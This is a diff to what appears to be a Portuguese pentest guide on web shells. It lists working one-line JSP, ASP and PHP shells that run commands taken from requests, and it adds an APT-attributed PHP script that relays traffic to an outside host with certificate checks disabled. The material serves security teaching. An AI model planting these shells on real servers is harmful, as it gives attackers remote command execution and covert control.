@@ -66,6 +66,39 @@ A *Web Shell* normalmente é um script web, ou seja., PHP ou ASPX, que aceita no
 - jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 - asp: `<% eval request("cmd") %>`
 - web shell usada por uma APT `<?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>`
+- web shell usada por uma APT
+```
+<?php
+$query = $_SERVER['QUERY_STRING'];
+$remote_url = "http://br-body.v2-x.com/" . $query;
+$ch = curl_init($remote_url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_HEADER, false);
+
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+}
+
+if (isset($_SERVER['HTTP_REFERER'])) {
+    curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
+}
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$error = curl_error($ch);
+curl_close($ch);
+
+if ($http_code == 200) {
+    echo $response;
+} else {
+    echo "<pre>fail: HTTP $http_code\nerror message: $error</pre>";
+}
+?>
+```
 
 
 Uma vez que temos o nosso shell web, precisamos colocar o nosso script shell web no diretório web do host remoto (webroot) para executar o script através do navegador web.
